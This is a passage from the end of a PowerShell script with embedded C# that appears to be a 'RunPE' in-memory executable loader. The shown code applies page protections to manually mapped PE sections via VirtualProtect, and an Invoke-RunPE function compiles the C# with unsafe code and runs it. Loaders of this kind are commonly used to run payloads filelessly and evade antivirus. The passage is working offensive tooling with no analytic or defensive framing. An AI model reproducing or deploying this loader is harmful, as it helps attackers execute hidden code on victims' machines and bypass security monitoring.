            Utils.FreeMemory(_codebase);

        }

        public void SetPagePermissions()
        {
            for (var i = 0; i < _pe.FileHeader.NumberOfSections; i++)
            {
                var execute = ((uint)_pe.ImageSectionHeaders[i].Characteristics & NativeDeclarations.IMAGE_SCN_MEM_EXECUTE) != 0;
                var read = ((uint)_pe.ImageSectionHeaders[i].Characteristics & NativeDeclarations.IMAGE_SCN_MEM_READ) != 0;
                var write = ((uint)_pe.ImageSectionHeaders[i].Characteristics & NativeDeclarations.IMAGE_SCN_MEM_WRITE) != 0;

                var protection = NativeDeclarations.PAGE_EXECUTE_READWRITE;

                if (execute && read && write)
                {
                    protection = NativeDeclarations.PAGE_EXECUTE_READWRITE;
                }
                else if (!execute && read && write)
                {
                    protection = NativeDeclarations.PAGE_READWRITE;
                }
                else if (!write && execute && read)
                {
                    protection = NativeDeclarations.PAGE_EXECUTE_READ;
                }
                else if (!execute && !write && read)
                {
                    protection = NativeDeclarations.PAGE_READONLY;
                }
                else if (execute && !read && !write)
                {
                    protection = NativeDeclarations.PAGE_EXECUTE;
                }
                else if (!execute && !read && !write)
                {
                    protection = NativeDeclarations.PAGE_NOACCESS;
                }

                uint empty;
                var y = NativeDeclarations.VirtualProtect((IntPtr)(_codebase.ToInt64() + _pe.ImageSectionHeaders[i].VirtualAddress), (UIntPtr)_pe.ImageSectionHeaders[i].SizeOfRawData, protection, out empty);
            }
        }
    }
}
"@



function Invoke-RunPE {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $false)]
        [String]$program= ''
    )
    Begin {
		$cp = New-Object System.CodeDom.Compiler.CompilerParameters
		$cp.ReferencedAssemblies.Add("System.dll")
		$cp.ReferencedAssemblies.Add("System.Core.dll")
		$cp.ReferencedAssemblies.Add("System.Data.dll")
		$cp.ReferencedAssemblies.Add("System.Data.DataSetExtensions.dll")
		$cp.ReferencedAssemblies.Add("System.Xml.dll")
		$cp.ReferencedAssemblies.Add("System.Xml.Linq.dll")
		$cp.CompilerOptions = "/unsafe"
		Add-Type -TypeDefinition $RunPE -Language CSharp -CompilerParameters $cp
    }

    Process {
		[RunPE.Program]::Main()
    }

}
